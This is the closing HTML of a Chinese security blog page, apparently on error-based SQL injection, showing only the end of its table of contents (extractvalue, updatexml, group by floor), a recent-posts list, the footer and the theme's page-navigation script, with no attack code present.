toc-level-3"><a class="toc-link" href="#ST-PointFromGeoHash"><span class="toc-number">2.6.3.</span> <span class="toc-text">ST_PointFromGeoHash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xpath"><span class="toc-number">2.7.</span> <span class="toc-text">xpath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.8.</span> <span class="toc-text">extractvalue()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.8.1.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="toc-number">2.8.2.</span> <span class="toc-text">数据表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5"><span class="toc-number">2.8.3.</span> <span class="toc-text">字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-number">2.8.4.</span> <span class="toc-text">数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-number">2.9.</span> <span class="toc-text">updatexml()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">2.9.1.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8-1"><span class="toc-number">2.9.2.</span> <span class="toc-text">数据表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5-1"><span class="toc-number">2.9.3.</span> <span class="toc-text">字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE-1"><span class="toc-number">2.9.4.</span> <span class="toc-text">数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#group-by-floor"><span class="toc-number">2.10.</span> <span class="toc-text">group by floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">2.10.1.</span> <span class="toc-text">数据库版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="toc-number">2.10.2.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%A1%A8-2"><span class="toc-number">2.10.3.</span> <span class="toc-text">数据表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5-2"><span class="toc-number">2.10.4.</span> <span class="toc-text">字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE-2"><span class="toc-number">2.10.5.</span> <span class="toc-text">数据</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/22/JavaScriptPrototypePollution/" title="JavaScript Prototype污染">JavaScript Prototype污染</a><time datetime="2024-10-21T16:00:00.000Z" title="发表于 2024-10-22 00:00:00">2024-10-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/16/Sql-Injection_3/" title="SQL注入常见绕过技巧">SQL注入常见绕过技巧</a><time datetime="2024-10-15T16:00:00.000Z" title="发表于 2024-10-16 00:00:00">2024-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/15/regex/" title="RegEx基础">RegEx基础</a><time datetime="2024-10-14T16:00:00.000Z" title="发表于 2024-10-15 00:00:00">2024-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/15/PHP/" title="ctf中php题目随笔">ctf中php题目随笔</a><time datetime="2024-09-14T16:00:00.000Z" title="发表于 2024-09-15 00:00:00">2024-09-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/14/Sql-Injection_2/" title="SQL注入2-报错注入">SQL注入2-报错注入</a><time datetime="2024-02-13T16:00:01.000Z" title="发表于 2024-02-14 00:00:01">2024-02-14</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright"> &copy;2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> sw3rt</div><div class="footer_custom_text">What's up guys? Welcome to my blog!<p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="之,乎,者,也,矣,焉,哉" data-fontsize="15px" data-random="false" async="async"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
